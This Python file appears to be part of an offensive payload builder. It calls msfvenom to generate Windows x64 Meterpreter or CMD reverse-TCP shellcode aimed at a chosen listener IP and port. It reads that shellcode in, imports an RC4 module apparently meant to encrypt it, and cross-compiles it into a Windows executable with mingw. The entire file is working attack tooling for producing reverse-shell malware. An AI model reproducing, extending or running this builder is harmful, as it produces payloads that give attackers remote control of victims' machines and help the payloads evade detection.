import argparse
import subprocess
import os
from itertools import cycle
from RC4Encryption import RC4Encryption

# Generate templates if specified
def generateTemplate(args):
	if not args.lhost or not args.lport:
		print("[-] Listener IP and port are required for templates.")
		exit()
	if args.msf: # Meterpreter shell
		subprocess.run(["msfvenom","-p","windows/x64/meterpreter_reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
	if args.shell: # CMD shell
		subprocess.run(["msfvenom","-p","windows/x64/shell_reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
	return

# Read in shellcode, byte by byte into a list
def readShellcode(filePath):

	shellcode = []

	with open(filePath, "rb") as f:
		byte = f.read(1)
		while byte != b"":
			shellcode.append(byte)
			byte = f.read(1)

	return shellcode

# Compile to binary
def compile(args):
	if args.output.endswith(".exe"): # PE compilation
		p = subprocess.run([f"x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./build/standard/* -o ./output/{args.output}"], shell=True, capture_output=True)

	if args.output.endswith(".dll"): # DLL compilation (TO-DO)
		print("WIP1")

	if "returned 1 exit status" in p.stderr.decode():
			print("[-] Compilation failed.")
			exit()
	else:
		print("[+] Compilation successful. Check output folder.")
		exit()

	return